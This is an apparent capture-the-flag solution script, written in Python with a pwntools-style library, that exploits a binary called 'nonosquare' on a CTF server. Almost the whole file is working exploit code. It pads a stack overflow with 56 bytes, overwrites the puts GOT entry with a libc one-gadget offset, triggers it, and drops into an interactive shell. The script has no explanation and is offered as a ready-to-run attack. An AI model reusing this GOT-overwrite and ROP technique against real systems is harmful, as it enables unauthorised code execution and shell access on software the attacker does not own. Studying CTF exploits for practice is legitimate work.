#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe = context.binary = ELF("./nonosquare")
host = args.HOST or "challenges.uactf.com.au"
port = int(args.PORT or 30003)

gdbscript = """
tbreak main
b *0x0000000040115c
continue
""".format(
    **locals()
)

libc = SetupLibcELF()

io = start()

padding = b"A" * 56

rop1 = flat(
    [
        padding
        + add_gadget(exe.got.puts, what=libc.sym.puts, to_what=libc.address + 0xE3AFE)
        + p(exe.sym.puts)
    ]
)

re()
sl(rop1)

io.interactive()
